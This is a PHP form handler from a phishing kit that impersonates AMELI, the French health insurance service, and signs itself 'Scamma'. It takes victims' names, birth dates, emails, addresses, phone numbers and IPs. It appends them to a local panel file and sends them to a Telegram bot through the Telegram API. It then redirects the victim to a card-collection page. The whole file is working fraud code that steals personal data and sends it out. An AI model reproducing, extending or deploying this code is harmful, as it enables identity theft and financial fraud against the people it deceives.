<?php
include("../common/sub_includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
    session_start();
}

function sanitize($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, "UTF-8");
}

function ifdash($v) {
    $v = is_string($v) ? trim($v) : $v;
    return ($v === '' || $v === null) ? '-' : $v;
}

$Adresse            = isset($_POST['input_adresse'])  ? sanitize($_POST['input_adresse'])  : '';
$Complementdadresse = isset($_POST['input_adresse2']) ? sanitize($_POST['input_adresse2']) : '';
$zipcode            = isset($_POST['input_zipcode'])  ? sanitize($_POST['input_zipcode'])  : '';
$Tel                = isset($_POST['input_tel'])      ? sanitize($_POST['input_tel'])      : '';
$City               = isset($_POST['input_city'])     ? sanitize($_POST['input_city'])     : '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['adresse']        = $Adresse;
    $_SESSION['adresse2']       = $Complementdadresse;
    $_SESSION['input_zipcode']  = $zipcode;
    $_SESSION['tel']            = $Tel;
    $_SESSION['city']           = $City;

    $lastname   = ifdash(isset($_SESSION['Nom']) ? $_SESSION['Nom'] : '');
    $firstname  = ifdash(isset($_SESSION['Prenom']) ? $_SESSION['Prenom'] : '');
    $birthdate  = ifdash(isset($_SESSION['Ddn']) ? $_SESSION['Ddn'] : '');
    $email      = ifdash(isset($_SESSION['mail']) ? $_SESSION['mail'] : '');
    $address    = ifdash($Adresse);
    $address2   = ifdash($Complementdadresse);
    $city       = ifdash($City);
    $postalcode = ifdash($zipcode);
    $phone      = ifdash($Tel);
    $ip         = ifdash($_SERVER['REMOTE_ADDR']);
    $userAgent  = ifdash(isset($_SESSION['os']) ? $_SESSION['os'] : (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''));
    $date = date('d/m/Y');
    $heure = date('H\hi');

    $infoString = $firstname . " | " . $lastname . " | " . $birthdate . " | " . $email . " | " . $address . " | " . $address2 . " | " . $postalcode . " | " . $city . " | " . $phone . " | " . $ip . " | " . $date . " | " . $heure . PHP_EOL;

    $filePath = dirname(__DIR__) . '/panel/data/billing.txt';
    $fileDir = dirname($filePath);
    if (!is_dir($fileDir)) {
        mkdir($fileDir, 0777, true);
    }
    file_put_contents($filePath, $infoString, FILE_APPEND | LOCK_EX);

    $message  = "<b>🏦 [ +1 BILLING // AMELI ]</b>\n\n";
    $message .= "<b>👮‍♂️ Prénom :</b> <code>{$firstname}</code>\n";
    $message .= "<b>👩‍🚒 Nom :</b> <code>{$lastname}</code>\n";
    $message .= "<b>🎂 Naissance :</b> <code>{$birthdate}</code>\n";
    $message .= "<b>📧 Email :</b> <code>{$email}</code>\n";
    $message .= "<b>🏡 Adresse :</b> <code>{$address}</code>\n";
    $message .= "<b>🏡 Complément :</b> <code>{$address2}</code>\n";
    $message .= "<b>🏙️ Ville :</b> <code>{$city}</code>\n";
    $message .= "<b>🏷️ Code postal :</b> <code>{$postalcode}</code>\n";
    $message .= "<b>📞 Téléphone :</b> <code>{$phone}</code>\n\n";
    $message .= "<b>🌐 IP :</b> <code>{$ip}</code>\n";
    $message .= "<b>🌍 Pays :</b> <code>France</code>\n";
    $message .= "<blockquote><b>🕒 Rez le [ <code>{$date}</code> à <code>{$heure}</code> ]</b>\n";
    $message .= "<b>🧑‍💻 Scamma - [ <code>AMELI</code> ]</b></blockquote>";

    $postFieldsSend = [
        'chat_id' => $rez_billing,
        'text' => $message,
        'parse_mode' => 'HTML',
    ];
    $sendUrl = "https://api.telegram.org/bot{$bot_token}/sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFieldsSend);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_exec($ch);
    curl_close($ch);

    header('location: ../pages/card.php');
    exit;
}
